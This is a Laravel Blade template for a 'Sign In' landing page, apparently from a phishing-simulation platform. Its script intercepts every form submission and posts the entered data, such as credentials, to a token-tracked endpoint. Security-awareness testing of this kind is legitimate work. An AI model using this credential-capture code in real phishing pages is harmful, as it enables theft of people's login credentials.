<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In</title>
</head>
<body>

{{-- Render custom landing page HTML --}}
{!! $html !!}

@if($capture_credentials)
  {{-- Inject credential capture form if not already in HTML --}}
  <script>
    // Intercept any form submissions and redirect to tracking endpoint
    document.addEventListener('DOMContentLoaded', function() {
      var forms = document.querySelectorAll('form');
      forms.forEach(function(form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          var data = new FormData(form);
          data.append('_token', '{{ csrf_token() }}');
          fetch('/t/submit/{{ $token }}', {
            method: 'POST',
            body: data
          }).then(function() {
            window.location.href = '/t/submit/{{ $token }}';
          });
        });
      });
    });
  </script>
@endif

</body>
</html>
